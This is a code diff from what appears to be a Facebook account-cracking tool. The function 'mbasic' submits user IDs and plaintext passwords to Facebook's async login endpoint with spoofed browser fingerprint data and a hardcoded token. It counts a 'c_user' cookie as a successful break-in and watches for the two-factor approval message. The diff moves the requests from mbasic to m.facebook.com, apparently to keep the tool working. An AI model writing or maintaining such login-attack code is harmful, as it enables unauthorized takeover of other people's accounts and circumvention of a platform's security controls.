@@ -1255,7 +1255,7 @@ def mbasic(uid,pwx,tl):
             'is_smart_lock': 'false',
             'bi_xrwh': '0',
             'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow(){ [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass': "#PWD_BROWSER:5:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'fb_dtsg': 'NAcNnumvQnDoEGxbaPpVz-lKtmmlpH6vYvE7_favLJ2zNewjuCIEAVA:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1288,12 +1288,12 @@ def mbasic(uid,pwx,tl):
             'cancel': 'https://bikroy.com/facebook-callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied#_=_',
             'lwv': '100',}
             headers = {
-            'authority': 'mbasic.facebook.com',
+            'authority': 'm.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1310,7 +1310,7 @@ def mbasic(uid,pwx,tl):
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://mbasic.facebook.com/login/device-based/login/async/'
+            url = 'https://m.facebook.com/login/device-based/login/async/'
             po = Session.post(url, params=params, cookies=cookies, headers=headers, data=data, allow_redirects = False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
